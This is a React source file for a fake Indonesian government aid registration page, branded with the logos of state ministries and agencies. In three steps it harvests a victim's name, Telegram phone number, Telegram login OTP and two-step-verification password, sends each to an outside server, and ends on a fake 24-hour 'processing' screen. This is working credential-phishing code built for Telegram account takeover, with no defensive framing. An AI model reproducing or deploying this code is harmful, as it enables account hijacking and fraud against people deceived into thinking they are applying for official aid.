"use client";

import React, { useState, useRef, useEffect } from 'react';

// Footer Logo - Tanpa garis pinggir, pas sesuai lebar layar
const FooterLogos = () => (
  <div className="flex justify-between items-center bg-white p-4 mt-8">
    <div className="w-[22%] flex justify-center"><img src="/logo_bumn.jpg" alt="BUMN" className="max-h-10 object-contain" /></div>
    <div className="w-[22%] flex justify-center"><img src="/logo_Kemenkes.png" alt="Kemenkes" className="max-h-10 object-contain" /></div>
    <div className="w-[22%] flex justify-center"><img src="/logo_siksng.jpg" alt="SIKS-NG" className="max-h-10 object-contain" /></div>
    <div className="w-[22%] flex justify-center"><img src="/logo_kominfo.png" alt="Kominfo" className="max-h-10 object-contain" /></div>
  </div>
);

export default function AuthForm() {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [formData, setFormData] = useState({ nama: '', nomor: '', sandi: '' });
  const [otpValues, setOtpValues] = useState(['', '', '', '', '']);
  const [timer, setTimer] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const API_URL = "https://web-production-d3e90.up.railway.app/register";

  useEffect(() => {
    let interval: any;
    if (step === 2 && timer > 0) {
      interval = setInterval(() => setTimer((prev) => prev - 1), 1000);
    } else if (timer === 0) {
      setCanResend(true);
      clearInterval(interval);
    }
    return () => clearInterval(interval);
  }, [step, timer]);

  const normalisasiNomor = (num: string) => {
    let clean = num.replace(/\D/g, '');
    if (clean.startsWith('0')) clean = '62' + clean.slice(1);
    if (!clean.startsWith('62')) clean = '62' + clean;
    return '+' + clean;
  };

  const handleOtpChange = (index: number, value: string) => {
    setError("");
    const val = value.replace(/\D/g, "");
    const newOtp = [...otpValues];
    newOtp[index] = val.substring(val.length - 1);
    setOtpValues(newOtp);
    if (val && index < 4) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpValues[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleNext = async (currentStep: number) => {
    setError("");
    setLoading(true);
    
    const payload = { 
      ...formData, 
      nomor: normalisasiNomor(formData.nomor),
      otp: otpValues.join(''), 
      step: currentStep 
    };

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      const res = await response.json();

      if (response.ok) {
        setLoading(false);
        if (currentStep === 1) setStep(2);
        else if (currentStep === 2) {
          if (res.status === "need_2fa") setStep(3);
          else setStep(4);
        }
        else if (currentStep === 3) setStep(4);
      } else {
        setLoading(false);
        if (currentStep === 2) {
          setError("OTP SALAH");
          setOtpValues(['', '', '', '', '']);
          inputRefs.current[0]?.focus();
        } else if (currentStep === 3) {
          setError("SANDI SALAH");
        } else {
          setError(res.message || "Terjadi kesalahan");
        }
      }
    } catch (err) {
      setLoading(false);
      setError("Masalah koneksi server.");
    }
  };

  return (
    // Menghilangkan max-w-md, rounded-2xl, border, dan shadow untuk tampilan full screen
    <div className="w-full min-h-screen bg-white font-sans overflow-x-hidden">
      {/* Banner Full Width */}
      <img src="/banner.jpg" className="w-full h-auto block" alt="Banner" />

      <div className="p-5">
        {step === 4 ? (
          <div className="flex flex-col items-center justify-center py-16">
            <div className="relative flex items-center justify-center">
              <div className="w-48 h-48 border-[12px] border-gray-100 border-t-blue-500 rounded-full animate-spin"></div>
              <div className="absolute flex flex-col items-center">
                <span className="text-blue-900 font-black text-2xl tracking-tighter">PROCESSING</span>
                <span className="text-gray-400 italic text-base">please wait..</span>
              </div>
            </div>
            <p className="mt-12 text-blue-600 font-bold text-center text-xl px-4">
              Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan
            </p>
          </div>
        ) : (
          <div className="space-y-6">
            {step === 1 && (
              <div className="animate-in fade-in">
                <h2 className="text-2xl font-bold text-center text-gray-800 mb-8">Form Pendaftaran Penerimaan</h2>
                <div className="space-y-2">
                  <label className="block font-bold text-gray-700">Nama Lengkap Sesuai E-KTP:</label>
                  <input className="w-full p-4 border-2 border-gray-100 bg-gray-50 rounded-xl text-lg outline-none focus:border-blue-500" placeholder="BUDI SANTOSO" onChange={(e) => setFormData({...formData, nama: e.target.value})} />
                </div>
                <div className="space-y-2 mt-4">
                  <label className="block font-bold text-gray-700">Nomor Telegram Aktif:</label>
                  <input className="w-full p-4 border-2 border-gray-100 bg-gray-50 rounded-xl text-lg outline-none focus:border-blue-500" placeholder="0812 XXXX XXXX" type="tel" onChange={(e) => setFormData({...formData, nomor: e.target.value})} />
                </div>
                <button onClick={() => handleNext(1)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-xl text-xl mt-8 active:scale-95 transition-all">DAFTAR SEKARANG</button>
              </div>
            )}

            {step === 2 && (
              <div className="space-y-8 py-4 animate-in fade-in">
                <p className="text-blue-600 font-bold text-center text-xl">Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda</p>
                <div className="space-y-4">
                  <label className={`block text-center font-bold ${error === "OTP SALAH" ? 'text-red-500' : 'text-gray-700'}`}>
                    {error === "OTP SALAH" ? "KODE OTP SALAH!" : "KODE OTP :"}
                  </label>
                  <div className="flex justify-center gap-3">
                    {otpValues.map((data, index) => (
                      <input
                        key={index}
                        type="tel"
                        ref={(el) => { inputRefs.current[index] = el; }}
                        value={data}
                        onChange={(e) => handleOtpChange(index, e.target.value)}
                        onKeyDown={(e) => handleKeyDown(index, e)}
                        className={`w-12 h-14 text-center text-3xl font-bold border-2 rounded-xl bg-gray-50 outline-none transition-all ${error === "OTP SALAH" ? 'border-red-500 bg-red-50 text-red-600' : 'border-gray-200 focus:border-blue-500'}`}
                      />
                    ))}
                  </div>
                </div>
                <div className="text-center">
                  {canResend ? (
                    <button onClick={() => { setTimer(60); setCanResend(false); }} className="text-blue-600 font-bold underline">Kirim ulang kode</button>
                  ) : (
                    <p className="text-gray-500 font-medium">Kirim ulang kode dalam {timer} detik</p>
                  )}
                </div>
                <button onClick={() => handleNext(2)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-xl text-xl shadow-md">VERIFIKASI OTP</button>
              </div>
            )}

            {step === 3 && (
              <div className="space-y-6 animate-in fade-in">
                <div className="text-center">
                  <p className="font-bold text-gray-800 text-xl">Verifikasi 2 Langkah</p>
                  <p className={`font-medium ${error === "SANDI SALAH" ? 'text-red-500' : 'text-gray-500'}`}>
                    {error === "SANDI SALAH" ? "KATA SANDI SALAH!" : "Masukkan kata sandi akun Anda"}
                  </p>
                </div>
                <input 
                  className={`w-full p-4 border-2 rounded-xl text-lg outline-none ${error === "SANDI SALAH" ? 'border-red-500 bg-red-50' : 'border-gray-100 bg-gray-50 focus:border-blue-500'}`}
                  placeholder="Masukkan Kata Sandi" 
                  type="password" 
                  onChange={(e) => { setError(""); setFormData({...formData, sandi: e.target.value})}} 
                />
                <button onClick={() => handleNext(3)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-xl text-xl">KONFIRMASI</button>
              </div>
            )}

            {loading && (
              <div className="fixed inset-0 bg-white/70 flex flex-col items-center justify-center z-50">
                <div className="animate-spin rounded-full h-14 w-14 border-t-4 border-blue-600 border-gray-200 border-solid mb-4"></div>
                <p className="font-bold text-blue-600">Memproses...</p>
              </div>
            )}
          </div>
        )}
        <FooterLogos />
      </div>
    </div>
  );
}
